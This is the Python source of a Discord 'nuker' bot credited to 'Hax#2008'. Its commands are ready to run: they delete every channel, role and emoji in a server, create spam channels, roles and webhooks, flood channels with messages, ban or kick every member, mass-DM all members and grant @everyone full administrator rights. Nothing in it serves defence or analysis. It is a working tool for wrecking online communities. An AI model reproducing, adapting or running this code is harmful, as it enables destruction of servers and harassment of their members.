import discord
import asyncio
import colorama
import json
import random
import os
import aiohttp
from discord.ext import commands
from discord import Permissions, Webhook

# Initialize aiohttp session with SSL verification enabled
aiohttp_session = aiohttp.ClientSession()

# Initialize bot with command prefix and all intents
client = commands.Bot(command_prefix="!", intents=discord.Intents.all())

# Load configuration from config.json
with open('config.json', 'r') as f:
    config = json.load(f)
token = config['token']
channel_names = config['channel_names']
message_spam = config['message_spam']
webhook_names = config['webhook_names']

@client.event
async def on_ready():
    os.system('cls' if os.name == 'nt' else 'clear')
    await client.change_presence(activity=discord.Game(name="Hey! I'm Spaceio!"))
    print(colorama.Fore.GREEN + r'''
       
____ ___ __________ _______ __
\ \/ /____ ____ \____ / \ \ __ __| | __ ___________
 \ // __ \ / \ / / / | \| | \ |/ // __ \_ __ \
 / \ ___/| | \/ /_ / | \ | / <\ ___/| | \/
/___/\ \___ >___| /_______ \ \____|__ /____/|__|_ \ \___ >__|
      \_/ \/ \/ \/ \/ \/ \/ made by Hax#2008
''')
    print(colorama.Fore.RED + f'''══════════════════════════════════════════════════════
            Logged In As {client.user}
            Type !help To Begin
            Version: v1
══════════════════════════════════════════════════════
''')

@client.event
async def on_guild_channel_create(channel):
    try:
        # Create webhook
        webhook = await channel.create_webhook(name=random.choice(webhook_names))
        # Send messages with rate-limit handling
        for _ in range(10): # Limited iterations to avoid rate limits
            await channel.send(random.choice(message_spam))
            await webhook.send(random.choice(message_spam), username=random.choice(webhook_names))
            await asyncio.sleep(1) # Delay to prevent rate-limiting
    except discord.errors.HTTPException as e:
        print(f"\x1b[38;5;196mError in channel {channel.name}: {e}")

@client.command()
async def nuke(ctx, amount: int = 50):
    await ctx.message.delete()
    try:
        await ctx.guild.edit(name="Nuked Server")
        # Delete channels
        for channel in ctx.guild.channels:
            try:
                await channel.delete()
                print(f"\x1b[38;5;34m{channel.name} Has Been Successfully Deleted!")
            except:
                print(f"\x1b[38;5;196mUnable To Delete Channel {channel.name}!")
        # Create new channels
        for i in range(min(amount, 50)): # Cap at 50 to avoid hitting limits
            try:
                await ctx.guild.create_text_channel(random.choice(channel_names))
                print(f"\x1b[38;5;34mSuccessfully Made Channel [{i}]!")
            except:
                print("\x1b[38;5;196mUnable To Create Channel!")
            await asyncio.sleep(0.5) # Rate-limit delay
        # Delete roles
        for role in ctx.guild.roles:
            try:
                await role.delete()
                print(f"\x1b[38;5;34m{role.name} Has Been Successfully Deleted!")
            except:
                print(f"\x1b[38;5;196m{role.name} Is Unable To Be Deleted")
        # Spam messages and ban members
        for channel in ctx.guild.channels:
            try:
                for _ in range(5): # Reduced iterations
                    await channel.send(random.choice(message_spam))
                    print(f"\x1b[38;5;34m{channel.name} Has Been Pinged!")
                    await asyncio.sleep(1) # Rate-limit delay
            except:
                print(f"\x1b[38;5;196mUnable To Ping {channel.name}!")
        for member in ctx.guild.members:
            if member.id != client.user.id: # Exclude bot itself
                try:
                    await member.ban(reason="Nuked")
                    print(f"\x1b[38;5;34m{member.name} Has Been Successfully Banned In {ctx.guild.name}")
                except:
                    print(f"\x1b[38;5;196mUnable To Ban {member.name} In {ctx.guild.name}!")
                await asyncio.sleep(0.5) # Rate-limit delay
    except discord.errors.HTTPException as e:
        print(f"\x1b[38;5;196mError during nuke: {e}")

@client.command()
async def banall(ctx):
    await ctx.message.delete()
    for member in list(ctx.guild.members):
        if member.id != client.user.id: # Exclude bot
            try:
                await ctx.guild.ban(member)
                print(f"\x1b[38;5;34m{member.name} Has Been Successfully Banned In {ctx.guild.name}")
                await asyncio.sleep(0.5) # Rate-limit delay
            except:
                print(f"\x1b[38;5;196mUnable To Ban {member.name} In {ctx.guild.name}!")

@client.command()
async def kickall(ctx):
    await ctx.message.delete()
    for member in list(ctx.guild.members):
        if member.id != client.user.id: # Exclude bot
            try:
                await member.kick(reason="Nuked")
                print(f"\x1b[38;5;34m{member.name} Has Been Successfully Kicked In {ctx.guild.name}")
                await asyncio.sleep(0.5) # Rate-limit delay
            except:
                print(f"\x1b[38;5;196mUnable To Kick {member.name} In {ctx.guild.name}!")

@client.command()
async def rolespam(ctx):
    await ctx.message.delete()
    for i in range(1, 50): # Reduced to avoid hitting role limit
        try:
            await ctx.guild.create_role(name=f"Nuked_{i}")
            print(f"\x1b[38;5;34mSuccessfully Created Role In {ctx.guild.name}!")
            await asyncio.sleep(0.5) # Rate-limit delay
        except:
            print(f"\x1b[38;5;196mUnable To Create Roles In {ctx.guild.name}!")

@client.command()
async def emojidel(ctx):
    await ctx.message.delete()
    for emoji in list(ctx.guild.emojis):
        try:
            await emoji.delete()
            print(f"\x1b[38;5;34mSuccessfully Deleted Emoji {emoji.name} In {ctx.guild.name}!")
            await asyncio.sleep(0.5) # Rate-limit delay
        except:
            print(f"\x1b[38;5;196mUnable To Delete Emoji {emoji.name} In {ctx.guild.name}!")

@client.command()
async def dm(ctx, *, message: str):
    await ctx.message.delete()
    for member in list(ctx.guild.members):
        if member.id != client.user.id: # Exclude bot
            try:
                await member.send(message)
                print(f"\x1b[38;5;34mDMed {member.name} In {ctx.guild.name}!")
                await asyncio.sleep(1) # Rate-limit delay
            except:
                print(f"\x1b[38;5;196mUnable To DM {member.name} In {ctx.guild.name}!")

@client.command()
async def admin(ctx):
    await ctx.message.delete()
    for role in list(ctx.guild.roles):
        if role.name == '@everyone':
            try:
                await role.edit(permissions=Permissions.all())
                print(f"\x1b[38;5;34mGave @everyone Admin In {ctx.guild.name}!")
            except:
                print(f"\x1b[38;5;196mUnable To Give @everyone Admin In {ctx.guild.name}!")

# Run the bot
try:
    client.run(token)
finally:
    # Ensure aiohttp session is closed on bot shutdown
    asyncio.run(aiohttp_session.close())
